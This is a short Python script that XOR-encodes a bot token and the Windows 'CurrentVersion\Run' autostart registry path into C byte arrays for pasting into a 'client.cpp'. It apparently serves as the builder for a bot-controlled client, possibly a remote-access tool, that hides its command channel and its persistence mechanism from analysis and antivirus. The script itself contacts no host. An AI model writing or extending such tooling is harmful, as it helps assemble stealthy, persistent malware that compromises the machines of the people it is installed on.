import sys

KEY = 0x55

def xor_encrypt(s: str) -> str:
    encrypted = [ord(c) ^ KEY for c in s]
    hex_vals = ", ".join(f"0x{b:x}" for b in encrypted) + ", 0x00"
    return f"{{{hex_vals}}}"

if len(sys.argv) < 2:
    print("Usage: python gen_enc.py <bot_token>")
    sys.exit(1)

token = sys.argv[1]
reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

print(f"\n// Replace in client.cpp:\n")
print(f"const unsigned char encryptedBotToken[] = {xor_encrypt(token)};")
print(f"\n// Registry path (unchanged, for reference):")
print(f"const unsigned char encryptedRegPath[] = {xor_encrypt(reg_path)};")
print(f"\n// encryptedRegPath length check: {len(reg_path)} chars")
print(f"// encryptedBotToken length check: {len(token)} chars")
